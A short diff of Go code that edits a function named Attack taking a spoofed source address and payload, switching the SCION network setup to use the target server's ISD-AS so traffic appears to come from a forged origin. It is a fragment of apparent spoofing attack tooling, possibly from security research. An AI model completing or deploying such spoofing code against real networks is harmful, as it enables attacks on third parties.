@@ -102,19 +102,19 @@ func Attack(ctx context.Context, serverAddr string, spoofedSrc string, payload [
 
 
 	//spoofedIA := spoofedAddr.IA
-	//meowIA := meowServerAddr.IA
+	meowIA := meowServerAddr.IA
 	//sciondConn.LocalIA = spoofedIA
 
-	localIA, err := sciondConn.LocalIA(ctx)
+	//localIA, err := sciondConn.LocalIA(ctx)
 	//sciondConn.address = spoofedSrc
 
 
 
-	pathQuerier := sciond.Querier{Connector: sciondConn, IA: localIA}
+	pathQuerier := sciond.Querier{Connector: sciondConn, IA: meowIA}
 
 	//spoofedIA
 	nnet := snet.NewNetworkWithPR(
-		localIA,
+		meowIA,
 		dispatcher,
 		pathQuerier,
 		sciond.RevHandler{Connector: sciondConn},
